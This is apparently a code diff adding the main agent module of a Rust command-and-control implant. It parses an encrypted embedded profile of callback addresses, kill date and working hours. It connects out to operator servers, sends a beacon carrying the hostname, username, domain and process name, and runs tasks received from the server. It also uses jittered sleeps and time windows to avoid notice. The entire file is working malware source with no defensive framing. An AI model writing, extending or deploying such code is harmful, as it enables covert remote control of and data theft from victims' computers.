@@ -1,0 +1,273 @@
+use std::env;
+use std::thread;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
+
+use crate::commander;
+use crate::connector_tcp::ConnectorTCP;
+use crate::downloader::Downloader;
+use crate::jobs::JobsController;
+use crate::protocol::{self, ReaderLE, WriterBE};
+
+#[derive(Clone, Debug)]
+pub struct EmbeddedProfile {
+    pub profile_type: u32,
+    pub addresses: Vec<String>,
+    pub conn_timeout: u64,
+    pub conn_count: u32,
+    pub sleep_secs: u32,
+    pub jitter: u32,
+    pub kill_date: i64,
+    pub work_start: i32,
+    pub work_end: i32,
+}
+
+pub struct Agent {
+    pub active: bool,
+    pub session_key: Vec<u8>,
+    pub sleep_ms: u64,
+    pub jitter: u32,
+    pub kill_date: i64,
+    pub work_start: i32,
+    pub work_end: i32,
+    pub profile: EmbeddedProfile,
+    pub connector: ConnectorTCP,
+    pub jobs: JobsController,
+    pub downloader: Downloader,
+}
+
+impl Agent {
+    pub fn from_blob(blob: &[u8]) -> Result<Self, String> {
+        if blob.len() <= 32 {
+            return Err("embedded profile too short".to_string());
+        }
+
+        let session_key = blob[..32].to_vec();
+        let plaintext = crate::crypto::decrypt(&blob[32..], &session_key).map_err(|err| err.to_string())?;
+        let profile = Self::parse_profile(&plaintext)?;
+
+        Ok(Self {
+            active: true,
+            sleep_ms: (profile.sleep_secs.max(5) as u64) * 1000,
+            jitter: profile.jitter,
+            kill_date: profile.kill_date,
+            work_start: profile.work_start,
+            work_end: profile.work_end,
+            profile,
+            session_key,
+            connector: ConnectorTCP::new(),
+            jobs: JobsController::new(),
+            downloader: Downloader::new(),
+        })
+    }
+
+    fn parse_profile(data: &[u8]) -> Result<EmbeddedProfile, String> {
+        let mut r = ReaderLE::new(data);
+        let profile_type = r.read_u32();
+        let addr_count = r.read_u32() as usize;
+        let mut addresses = Vec::with_capacity(addr_count);
+        for _ in 0..addr_count {
+            let addr = r.read_string();
+            if !addr.is_empty() {
+                addresses.push(addr);
+            }
+        }
+        if addresses.is_empty() {
+            return Err("profile has no callback addresses".to_string());
+        }
+
+        let _banner_size = r.read_u32();
+        let conn_timeout = r.read_u32().max(1) as u64;
+        let conn_count = r.read_u32();
+        let _use_ssl = r.read_u8();
+        let _client_cert = r.read_bytes();
+        let _client_key = r.read_bytes();
+        let _ca_cert = r.read_bytes();
+        let sleep_secs = r.read_u32();
+        let jitter = r.read_u32();
+        let kill_date = r.read_u32() as i64;
+        let work_start = r.read_u32() as i32;
+        let work_end = r.read_u32() as i32;
+
+        Ok(EmbeddedProfile {
+            profile_type,
+            addresses,
+            conn_timeout,
+            conn_count,
+            sleep_secs,
+            jitter,
+            kill_date,
+            work_start,
+            work_end,
+        })
+    }
+
+    pub fn run(&mut self) {
+        let mut conn_attempts = 0u32;
+
+        while self.active && !self.should_exit() {
+            self.wait_for_working_hours();
+
+            let addr = self.profile.addresses[(conn_attempts as usize) % self.profile.addresses.len()].clone();
+            conn_attempts = conn_attempts.saturating_add(1);
+
+            if self.connector.set_target(&addr, self.profile.conn_timeout).and_then(|_| self.connector.connect()).is_err() {
+                self.connector.disconnect();
+                self.sleep_with_jitter();
+                if self.profile.conn_count > 0 && conn_attempts >= self.profile.conn_count {
+                    break;
+                }
+                continue;
+            }
+
+            conn_attempts = 0;
+
+            let mut init_frame = Vec::with_capacity(8 + 256);
+            init_frame.extend_from_slice(&self.profile.profile_type.to_be_bytes());
+            init_frame.extend_from_slice(&Self::random_u32().to_be_bytes());
+            init_frame.extend_from_slice(&self.build_beat());
+
+            if self.connector.send_frame(&init_frame, &self.session_key).is_err() {
+                self.connector.disconnect();
+                self.sleep_with_jitter();
+                continue;
+            }
+
+            while self.active && !self.should_exit() {
+                let task_blob = match self.connector.recv_frame(&self.session_key) {
+                    Ok(data) => data,
+                    Err(_) => break,
+                };
+
+                let response = commander::process_tasks(self, &task_blob).unwrap_or_default();
+                if self.connector.send_frame(&response, &self.session_key).is_err() {
+                    break;
+                }
+                let _ = self.jobs.reap();
+            }
+
+            self.connector.disconnect();
+            self.sleep_with_jitter();
+        }
+
+        self.connector.disconnect();
+    }
+
+    fn build_beat(&self) -> Vec<u8> {
+        let hostname = env::var("COMPUTERNAME")
+            .or_else(|_| env::var("HOSTNAME"))
+            .unwrap_or_default();
+        let username = env::var("USER")
+            .or_else(|_| env::var("USERNAME"))
+            .unwrap_or_default();
+        let domain = env::var("USERDOMAIN").unwrap_or_default();
+        let process = env::current_exe()
+            .ok()
+            .and_then(|p| p.file_name().map(|f| f.to_string_lossy().to_string()))
+            .unwrap_or_else(|| "__NAME__".to_string());
+
+        let mut w = WriterBE::new();
+        w.write_u32((self.sleep_ms / 1000) as u32);
+        w.write_u32(self.jitter);
+        w.write_u32(self.kill_date.max(0) as u32);
+        w.write_u32(encode_working_time(self.work_start, self.work_end));
+        w.write_u16(0);
+        w.write_u16(0);
+        w.write_u8(0);
+        w.write_u16(std::process::id() as u16);
+        w.write_u16(0);
+        w.write_u32(0);
+        w.write_u8(10);
+        w.write_u8(0);
+        w.write_u32(0);
+
+        let mut flags = 0u8;
+        if cfg!(target_pointer_width = "64") {
+            flags |= 0x01 | 0x02;
+        }
+        w.write_u8(flags);
+        w.write_bytes(&self.session_key);
+        w.write_bytes(domain.as_bytes());
+        w.write_bytes(hostname.as_bytes());
+        w.write_bytes(username.as_bytes());
+        w.write_bytes(process.as_bytes());
+        w.into_bytes()
+    }
+
+    pub fn dispatch(&mut self, cmd_code: u32, _cmd_id: u32, data: &[u8]) -> Option<Vec<u8>> {
+        commander::dispatch(self, cmd_code, 0, data)
+    }
+
+    pub fn sleep_with_jitter(&self) {
+        let ms = self.sleep_ms as i64;
+        let actual = if self.jitter > 0 && self.jitter <= 90 {
+            let j = self.jitter as i64;
+            let seed = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .subsec_nanos() as i64;
+            let pct = (seed % (j * 2 + 1)) - j;
+            let adj = ms * pct / 100;
+            let total = ms + adj;
+            if total < 500 { 500u64 } else { total as u64 }
+        } else {
+            ms.max(500) as u64
+        };
+        thread::sleep(Duration::from_millis(actual));
+    }
+
+    pub fn should_exit(&self) -> bool {
+        if self.kill_date <= 0 {
+            return false;
+        }
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs() as i64;
+        now >= self.kill_date
+    }
+
+    pub fn wait_for_working_hours(&self) {
+        if self.work_start == 0 && self.work_end == 0 {
+            return;
+        }
+        loop {
+            let now = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs();
+            let day_secs = (now % 86400) as i32;
+            let hhmm = (day_secs / 3600) * 100 + (day_secs % 3600) / 60;
+            let in_window = if self.work_start <= self.work_end {
+                hhmm >= self.work_start && hhmm < self.work_end
+            } else {
+                hhmm >= self.work_start || hhmm < self.work_end
+            };
+            if in_window {
+                break;
+            }
+            thread::sleep(Duration::from_secs(60));
+        }
+    }
+
+    fn random_u32() -> u32 {
+        let nanos = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_nanos();
+        (nanos as u64 ^ ((nanos >> 32) as u64)) as u32
+    }
+}
+
+fn encode_working_time(start: i32, end: i32) -> u32 {
+    if start == 0 && end == 0 {
+        return 0;
+    }
+    let start_hour = start / 100;
+    let start_min = start % 100;
+    let end_hour = end / 100;
+    let end_min = end % 100;
+    ((start_hour as u32) << 24)
+        | ((start_min as u32) << 16)
+        | ((end_hour as u32) << 8)
+        | (end_min as u32)
+}
